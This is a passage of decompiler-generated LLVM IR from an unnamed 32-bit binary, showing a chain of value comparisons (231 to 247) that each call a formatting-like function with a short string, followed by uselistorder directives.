  %v5_804d293 = call i32 @function_8048c55(i32 %v2_804d281, i32 ptrtoint ([14 x i8]* @global_var_805b59d.272 to i32), i32 %v1_804d272, i32 %v1_804d268)
  br label %dec_label_pc_804d298

dec_label_pc_804d298:                             ; preds = %dec_label_pc_804d25f, %dec_label_pc_804d268
  %v13_804d298 = icmp eq i32 %v2_804a0a2, 231
  %v1_804d29f = icmp eq i1 %v13_804d298, false
  br i1 %v1_804d29f, label %dec_label_pc_804d2d1, label %dec_label_pc_804d2a1

dec_label_pc_804d2a1:                             ; preds = %dec_label_pc_804d298
  %v0_804d2a1 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d2a1 = zext i8 %v0_804d2a1 to i32
  store i32 %v1_804d2a1, i32* @edx, align 4
  %v0_804d2ab = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d2ab = zext i8 %v0_804d2ab to i32
  %v2_804d2ba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d2ba, i32* @ebx, align 4
  %v5_804d2cc = call i32 @function_8048c55(i32 %v2_804d2ba, i32 ptrtoint ([14 x i8]* @global_var_805b5ab.273 to i32), i32 %v1_804d2ab, i32 %v1_804d2a1)
  br label %dec_label_pc_804d2d1

dec_label_pc_804d2d1:                             ; preds = %dec_label_pc_804d298, %dec_label_pc_804d2a1
  %v13_804d2d1 = icmp eq i32 %v2_804a0a2, 232
  %v1_804d2d8 = icmp eq i1 %v13_804d2d1, false
  br i1 %v1_804d2d8, label %dec_label_pc_804d30a, label %dec_label_pc_804d2da

dec_label_pc_804d2da:                             ; preds = %dec_label_pc_804d2d1
  %v0_804d2da = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d2da = zext i8 %v0_804d2da to i32
  store i32 %v1_804d2da, i32* @edx, align 4
  %v0_804d2e4 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d2e4 = zext i8 %v0_804d2e4 to i32
  %v2_804d2f3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d2f3, i32* @ebx, align 4
  %v5_804d305 = call i32 @function_8048c55(i32 %v2_804d2f3, i32 ptrtoint ([14 x i8]* @global_var_805b5b9.274 to i32), i32 %v1_804d2e4, i32 %v1_804d2da)
  br label %dec_label_pc_804d30a

dec_label_pc_804d30a:                             ; preds = %dec_label_pc_804d2d1, %dec_label_pc_804d2da
  %v13_804d30a = icmp eq i32 %v2_804a0a2, 233
  %v1_804d311 = icmp eq i1 %v13_804d30a, false
  br i1 %v1_804d311, label %dec_label_pc_804d343, label %dec_label_pc_804d313

dec_label_pc_804d313:                             ; preds = %dec_label_pc_804d30a
  %v0_804d313 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d313 = zext i8 %v0_804d313 to i32
  store i32 %v1_804d313, i32* @edx, align 4
  %v0_804d31d = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d31d = zext i8 %v0_804d31d to i32
  %v2_804d32c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d32c, i32* @ebx, align 4
  %v5_804d33e = call i32 @function_8048c55(i32 %v2_804d32c, i32 ptrtoint ([14 x i8]* @global_var_805b5c7.275 to i32), i32 %v1_804d31d, i32 %v1_804d313)
  br label %dec_label_pc_804d343

dec_label_pc_804d343:                             ; preds = %dec_label_pc_804d30a, %dec_label_pc_804d313
  %v13_804d343 = icmp eq i32 %v2_804a0a2, 234
  %v1_804d34a = icmp eq i1 %v13_804d343, false
  br i1 %v1_804d34a, label %dec_label_pc_804d37c, label %dec_label_pc_804d34c

dec_label_pc_804d34c:                             ; preds = %dec_label_pc_804d343
  %v0_804d34c = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d34c = zext i8 %v0_804d34c to i32
  store i32 %v1_804d34c, i32* @edx, align 4
  %v0_804d356 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d356 = zext i8 %v0_804d356 to i32
  %v2_804d365 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d365, i32* @ebx, align 4
  %v5_804d377 = call i32 @function_8048c55(i32 %v2_804d365, i32 ptrtoint ([14 x i8]* @global_var_805b5d5.276 to i32), i32 %v1_804d356, i32 %v1_804d34c)
  br label %dec_label_pc_804d37c

dec_label_pc_804d37c:                             ; preds = %dec_label_pc_804d343, %dec_label_pc_804d34c
  %v13_804d37c = icmp eq i32 %v2_804a0a2, 235
  %v1_804d383 = icmp eq i1 %v13_804d37c, false
  br i1 %v1_804d383, label %dec_label_pc_804d3b5, label %dec_label_pc_804d385

dec_label_pc_804d385:                             ; preds = %dec_label_pc_804d37c
  %v0_804d385 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d385 = zext i8 %v0_804d385 to i32
  store i32 %v1_804d385, i32* @edx, align 4
  %v0_804d38f = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d38f = zext i8 %v0_804d38f to i32
  %v2_804d39e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d39e, i32* @ebx, align 4
  %v5_804d3b0 = call i32 @function_8048c55(i32 %v2_804d39e, i32 ptrtoint ([13 x i8]* @global_var_805b5e3.277 to i32), i32 %v1_804d38f, i32 %v1_804d385)
  br label %dec_label_pc_804d3b5

dec_label_pc_804d3b5:                             ; preds = %dec_label_pc_804d37c, %dec_label_pc_804d385
  %v13_804d3b5 = icmp eq i32 %v2_804a0a2, 236
  %v1_804d3bc = icmp eq i1 %v13_804d3b5, false
  br i1 %v1_804d3bc, label %dec_label_pc_804d3ee, label %dec_label_pc_804d3be

dec_label_pc_804d3be:                             ; preds = %dec_label_pc_804d3b5
  %v0_804d3be = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d3be = zext i8 %v0_804d3be to i32
  store i32 %v1_804d3be, i32* @edx, align 4
  %v0_804d3c8 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d3c8 = zext i8 %v0_804d3c8 to i32
  %v2_804d3d7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d3d7, i32* @ebx, align 4
  %v5_804d3e9 = call i32 @function_8048c55(i32 %v2_804d3d7, i32 ptrtoint ([13 x i8]* @global_var_805b5f0.278 to i32), i32 %v1_804d3c8, i32 %v1_804d3be)
  br label %dec_label_pc_804d3ee

dec_label_pc_804d3ee:                             ; preds = %dec_label_pc_804d3b5, %dec_label_pc_804d3be
  %v13_804d3ee = icmp eq i32 %v2_804a0a2, 237
  %v1_804d3f5 = icmp eq i1 %v13_804d3ee, false
  br i1 %v1_804d3f5, label %dec_label_pc_804d427, label %dec_label_pc_804d3f7

dec_label_pc_804d3f7:                             ; preds = %dec_label_pc_804d3ee
  %v0_804d3f7 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d3f7 = zext i8 %v0_804d3f7 to i32
  store i32 %v1_804d3f7, i32* @edx, align 4
  %v0_804d401 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d401 = zext i8 %v0_804d401 to i32
  %v2_804d410 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d410, i32* @ebx, align 4
  %v5_804d422 = call i32 @function_8048c55(i32 %v2_804d410, i32 ptrtoint ([13 x i8]* @global_var_805b5fd.279 to i32), i32 %v1_804d401, i32 %v1_804d3f7)
  br label %dec_label_pc_804d427

dec_label_pc_804d427:                             ; preds = %dec_label_pc_804d3ee, %dec_label_pc_804d3f7
  %v13_804d427 = icmp eq i32 %v2_804a0a2, 238
  %v1_804d42e = icmp eq i1 %v13_804d427, false
  br i1 %v1_804d42e, label %dec_label_pc_804d460, label %dec_label_pc_804d430

dec_label_pc_804d430:                             ; preds = %dec_label_pc_804d427
  %v0_804d430 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d430 = zext i8 %v0_804d430 to i32
  store i32 %v1_804d430, i32* @edx, align 4
  %v0_804d43a = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d43a = zext i8 %v0_804d43a to i32
  %v2_804d449 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d449, i32* @ebx, align 4
  %v5_804d45b = call i32 @function_8048c55(i32 %v2_804d449, i32 ptrtoint ([13 x i8]* @global_var_805b60a.280 to i32), i32 %v1_804d43a, i32 %v1_804d430)
  br label %dec_label_pc_804d460

dec_label_pc_804d460:                             ; preds = %dec_label_pc_804d427, %dec_label_pc_804d430
  %v13_804d460 = icmp eq i32 %v2_804a0a2, 239
  %v1_804d467 = icmp eq i1 %v13_804d460, false
  br i1 %v1_804d467, label %dec_label_pc_804d499, label %dec_label_pc_804d469

dec_label_pc_804d469:                             ; preds = %dec_label_pc_804d460
  %v0_804d469 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d469 = zext i8 %v0_804d469 to i32
  store i32 %v1_804d469, i32* @edx, align 4
  %v0_804d473 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d473 = zext i8 %v0_804d473 to i32
  %v2_804d482 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d482, i32* @ebx, align 4
  %v5_804d494 = call i32 @function_8048c55(i32 %v2_804d482, i32 ptrtoint ([13 x i8]* @global_var_805b617.281 to i32), i32 %v1_804d473, i32 %v1_804d469)
  br label %dec_label_pc_804d499

dec_label_pc_804d499:                             ; preds = %dec_label_pc_804d460, %dec_label_pc_804d469
  %v10_804d499 = icmp eq i32 %v2_804a0a2, 240
  %v1_804d4a0 = icmp eq i1 %v10_804d499, false
  br i1 %v1_804d4a0, label %dec_label_pc_804d4d2, label %dec_label_pc_804d4a2

dec_label_pc_804d4a2:                             ; preds = %dec_label_pc_804d499
  %v0_804d4a2 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d4a2 = zext i8 %v0_804d4a2 to i32
  store i32 %v1_804d4a2, i32* @edx, align 4
  %v0_804d4ac = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d4ac = zext i8 %v0_804d4ac to i32
  %v2_804d4bb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d4bb, i32* @ebx, align 4
  %v5_804d4cd = call i32 @function_8048c55(i32 %v2_804d4bb, i32 ptrtoint ([13 x i8]* @global_var_805b624.282 to i32), i32 %v1_804d4ac, i32 %v1_804d4a2)
  br label %dec_label_pc_804d4d2

dec_label_pc_804d4d2:                             ; preds = %dec_label_pc_804d499, %dec_label_pc_804d4a2
  %v13_804d4d2 = icmp eq i32 %v2_804a0a2, 241
  %v1_804d4d9 = icmp eq i1 %v13_804d4d2, false
  br i1 %v1_804d4d9, label %dec_label_pc_804d50b, label %dec_label_pc_804d4db

dec_label_pc_804d4db:                             ; preds = %dec_label_pc_804d4d2
  %v0_804d4db = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d4db = zext i8 %v0_804d4db to i32
  store i32 %v1_804d4db, i32* @edx, align 4
  %v0_804d4e5 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d4e5 = zext i8 %v0_804d4e5 to i32
  %v2_804d4f4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d4f4, i32* @ebx, align 4
  %v5_804d506 = call i32 @function_8048c55(i32 %v2_804d4f4, i32 ptrtoint ([14 x i8]* @global_var_805b631.283 to i32), i32 %v1_804d4e5, i32 %v1_804d4db)
  br label %dec_label_pc_804d50b

dec_label_pc_804d50b:                             ; preds = %dec_label_pc_804d4d2, %dec_label_pc_804d4db
  %v13_804d50b = icmp eq i32 %v2_804a0a2, 242
  %v1_804d512 = icmp eq i1 %v13_804d50b, false
  br i1 %v1_804d512, label %dec_label_pc_804d544, label %dec_label_pc_804d514

dec_label_pc_804d514:                             ; preds = %dec_label_pc_804d50b
  %v0_804d514 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d514 = zext i8 %v0_804d514 to i32
  store i32 %v1_804d514, i32* @edx, align 4
  %v0_804d51e = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d51e = zext i8 %v0_804d51e to i32
  %v2_804d52d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d52d, i32* @ebx, align 4
  %v5_804d53f = call i32 @function_8048c55(i32 %v2_804d52d, i32 ptrtoint ([13 x i8]* @global_var_805b63f.284 to i32), i32 %v1_804d51e, i32 %v1_804d514)
  br label %dec_label_pc_804d544

dec_label_pc_804d544:                             ; preds = %dec_label_pc_804d50b, %dec_label_pc_804d514
  %v13_804d544 = icmp eq i32 %v2_804a0a2, 243
  %v1_804d54b = icmp eq i1 %v13_804d544, false
  br i1 %v1_804d54b, label %dec_label_pc_804d57d, label %dec_label_pc_804d54d

dec_label_pc_804d54d:                             ; preds = %dec_label_pc_804d544
  %v0_804d54d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d54d = zext i8 %v0_804d54d to i32
  store i32 %v1_804d54d, i32* @edx, align 4
  %v0_804d557 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d557 = zext i8 %v0_804d557 to i32
  %v2_804d566 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d566, i32* @ebx, align 4
  %v5_804d578 = call i32 @function_8048c55(i32 %v2_804d566, i32 ptrtoint ([13 x i8]* @global_var_805b64c.285 to i32), i32 %v1_804d557, i32 %v1_804d54d)
  br label %dec_label_pc_804d57d

dec_label_pc_804d57d:                             ; preds = %dec_label_pc_804d544, %dec_label_pc_804d54d
  %v13_804d57d = icmp eq i32 %v2_804a0a2, 244
  %v1_804d584 = icmp eq i1 %v13_804d57d, false
  br i1 %v1_804d584, label %dec_label_pc_804d5b6, label %dec_label_pc_804d586

dec_label_pc_804d586:                             ; preds = %dec_label_pc_804d57d
  %v0_804d586 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d586 = zext i8 %v0_804d586 to i32
  store i32 %v1_804d586, i32* @edx, align 4
  %v0_804d590 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d590 = zext i8 %v0_804d590 to i32
  %v2_804d59f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d59f, i32* @ebx, align 4
  %v5_804d5b1 = call i32 @function_8048c55(i32 %v2_804d59f, i32 ptrtoint ([13 x i8]* @global_var_805b659.286 to i32), i32 %v1_804d590, i32 %v1_804d586)
  br label %dec_label_pc_804d5b6

dec_label_pc_804d5b6:                             ; preds = %dec_label_pc_804d57d, %dec_label_pc_804d586
  %v13_804d5b6 = icmp eq i32 %v2_804a0a2, 245
  %v1_804d5bd = icmp eq i1 %v13_804d5b6, false
  br i1 %v1_804d5bd, label %dec_label_pc_804d5ef, label %dec_label_pc_804d5bf

dec_label_pc_804d5bf:                             ; preds = %dec_label_pc_804d5b6
  %v0_804d5bf = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d5bf = zext i8 %v0_804d5bf to i32
  store i32 %v1_804d5bf, i32* @edx, align 4
  %v0_804d5c9 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d5c9 = zext i8 %v0_804d5c9 to i32
  %v2_804d5d8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d5d8, i32* @ebx, align 4
  %v5_804d5ea = call i32 @function_8048c55(i32 %v2_804d5d8, i32 ptrtoint ([13 x i8]* @global_var_805b666.287 to i32), i32 %v1_804d5c9, i32 %v1_804d5bf)
  br label %dec_label_pc_804d5ef

dec_label_pc_804d5ef:                             ; preds = %dec_label_pc_804d5b6, %dec_label_pc_804d5bf
  %v13_804d5ef = icmp eq i32 %v2_804a0a2, 246
  %v1_804d5f6 = icmp eq i1 %v13_804d5ef, false
  br i1 %v1_804d5f6, label %dec_label_pc_804d628, label %dec_label_pc_804d5f8

dec_label_pc_804d5f8:                             ; preds = %dec_label_pc_804d5ef
  %v0_804d5f8 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d5f8 = zext i8 %v0_804d5f8 to i32
  store i32 %v1_804d5f8, i32* @edx, align 4
  %v0_804d602 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d602 = zext i8 %v0_804d602 to i32
  %v2_804d611 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d611, i32* @ebx, align 4
  %v5_804d623 = call i32 @function_8048c55(i32 %v2_804d611, i32 ptrtoint ([13 x i8]* @global_var_805b673.288 to i32), i32 %v1_804d602, i32 %v1_804d5f8)
  br label %dec_label_pc_804d628

dec_label_pc_804d628:                             ; preds = %dec_label_pc_804d5ef, %dec_label_pc_804d5f8
  %v13_804d628 = icmp eq i32 %v2_804a0a2, 247
  %v1_804d62f = icmp eq i1 %v13_804d628, false
  br i1 %v1_804d62f, label %dec_label_pc_804d628.dec_label_pc_804d661_crit_edge, label %dec_label_pc_804d631

dec_label_pc_804d628.dec_label_pc_804d661_crit_edge: ; preds = %dec_label_pc_804d628
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804d661

dec_label_pc_804d631:                             ; preds = %dec_label_pc_804d628
  %v0_804d631 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804d631 = zext i8 %v0_804d631 to i32
  store i32 %v1_804d631, i32* @edx, align 4
  %v0_804d63b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804d63b = zext i8 %v0_804d63b to i32
  %v2_804d64a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804d64a, i32* @ebx, align 4
  %v5_804d65c = call i32 @function_8048c55(i32 %v2_804d64a, i32 ptrtoint ([13 x i8]* @global_var_805b680.289 to i32), i32 %v1_804d63b, i32 %v1_804d631)
  br label %dec_label_pc_804d661

dec_label_pc_804d661:                             ; preds = %dec_label_pc_804d628.dec_label_pc_804d661_crit_edge, %dec_label_pc_804d631
  %v2_804d661.pre-phi = phi i32 [ %.pre, %dec_label_pc_804d628.dec_label_pc_804d661_crit_edge ], [ %v2_804d64a, %dec_label_pc_804d631 ]
  %v1_804d667 = call i32 @function_8052304(i32 %v2_804d661.pre-phi)
  %v2_804d66f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d66f, i32* @ebx, align 4
  ret i32 %v1_804d667

; uselistorder directives
  uselistorder i32 %v2_804a0a2, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 248, 247 }
  uselistorder i32 %v1_804a062, { 1, 0 }
  uselistorder i32 %v2_804a054, { 1, 0 }
  uselistorder i32 %v2_804a014, { 1, 0 }
  uselistorder i32 %v2_8049fd4, { 1, 0 }
  uselistorder i32 %v2_8049f94, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8048c55, { 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34 }
  uselistorder i32 -2139062143, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_8053664, { 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_805e8da.42, { 249, 248, 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_805e8d9.41, { 249, 248, 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804d661, { 1, 0 }
  uselistorder label %dec_label_pc_804d628, { 1, 0 }
  uselistorder label %dec_label_pc_804d5ef, { 1, 0 }
  uselistorder label %dec_label_pc_804d5b6, { 1, 0 }
  uselistorder label %dec_label_pc_804d57d, { 1, 0 }
  uselistorder label %dec_label_pc_804d544, { 1, 0 }
  uselistorder label %dec_label_pc_804d50b, { 1, 0 }
  uselistorder label %dec_label_pc_804d4d2, { 1, 0 }
  uselistorder label %dec_label_pc_804d499, { 1, 0 }
  uselistorder label %dec_label_pc_804d460, { 1, 0 }
  uselistorder label %dec_label_pc_804d427, { 1, 0 }
  uselistorder label %dec_label_pc_804d3ee, { 1, 0 }
  uselistorder label %dec_label_pc_804d3b5, { 1, 0 }
  uselistorder label %dec_label_pc_804d37c, { 1, 0 }
  uselistorder label %dec_label_pc_804d343, { 1, 0 }
  uselistorder label %dec_label_pc_804d30a, { 1, 0 }
  uselistorder label %dec_label_pc_804d2d1, { 1, 0 }
  uselistorder label %dec_label_pc_804d298, { 1, 0 }
  uselistorder label %dec_label_pc_804d25f, { 1, 0 }
  uselistorder label %dec_label_pc_804d226, { 1, 0 }
  uselistorder label %dec_label_pc_804d1ed, { 1, 0 }
  uselistorder label %dec_label_pc_804d1b4, { 1, 0 }
  uselistorder label %dec_label_pc_804d17b, { 1, 0 }
  uselistorder label %dec_label_pc_804d142, { 1, 0 }
  uselistorder label %dec_label_pc_804d109, { 1, 0 }
  uselistorder label %dec_label_pc_804d0d0, { 1, 0 }
  uselistorder label %dec_label_pc_804d097, { 1, 0 }
  uselistorder label %dec_label_pc_804d05e, { 1, 0 }
  uselistorder label %dec_label_pc_804d025, { 1, 0 }
  uselistorder label %dec_label_pc_804cfec, { 1, 0 }
  uselistorder label %dec_label_pc_804cfb3, { 1, 0 }
  uselistorder label %dec_label_pc_804cf7a, { 1, 0 }
  uselistorder label %dec_label_pc_804cf41, { 1, 0 }
  uselistorder label %dec_label_pc_804cf08, { 1, 0 }
  uselistorder label %dec_label_pc_804cecf, { 1, 0 }
  uselistorder label %dec_label_pc_804ce96, { 1, 0 }
  uselistorder label %dec_label_pc_804ce5d, { 1, 0 }
  uselistorder label %dec_label_pc_804ce24, { 1, 0 }
  uselistorder label %dec_label_pc_804cdeb, { 1, 0 }
  uselistorder label %dec_label_pc_804cdb2, { 1, 0 }
  uselistorder label %dec_label_pc_804cd79, { 1, 0 }
  uselistorder label %dec_label_pc_804cd40, { 1, 0 }
  uselistorder label %dec_label_pc_804cd07, { 1, 0 }
  uselistorder label %dec_label_pc_804ccce, { 1, 0 }
  uselistorder label %dec_label_pc_804cc95, { 1, 0 }
  uselistorder label %dec_label_pc_804cc5c, { 1, 0 }
  uselistorder label %dec_label_pc_804cc23, { 1, 0 }
  uselistorder label %dec_label_pc_804cbea, { 1, 0 }
  uselistorder label %dec_label_pc_804cbb1, { 1, 0 }
  uselistorder label %dec_label_pc_804cb78, { 1, 0 }
  uselistorder label %dec_label_pc_804cb3f, { 1, 0 }
  uselistorder label %dec_label_pc_804cb06, { 1, 0 }
  uselistorder label %dec_label_pc_804cacd, { 1, 0 }
  uselistorder label %dec_label_pc_804ca94, { 1, 0 }
  uselistorder label %dec_label_pc_804ca5b, { 1, 0 }
  uselistorder label %dec_label_pc_804ca22, { 1, 0 }
  uselistorder label %dec_label_pc_804c9e9, { 1, 0 }
  uselistorder label %dec_label_pc_804c9b0, { 1, 0 }
  uselistorder label %dec_label_pc_804c977, { 1, 0 }
  uselistorder label %dec_label_pc_804c93e, { 1, 0 }
  uselistorder label %dec_label_pc_804c905, { 1, 0 }
  uselistorder label %dec_label_pc_804c8cc, { 1, 0 }
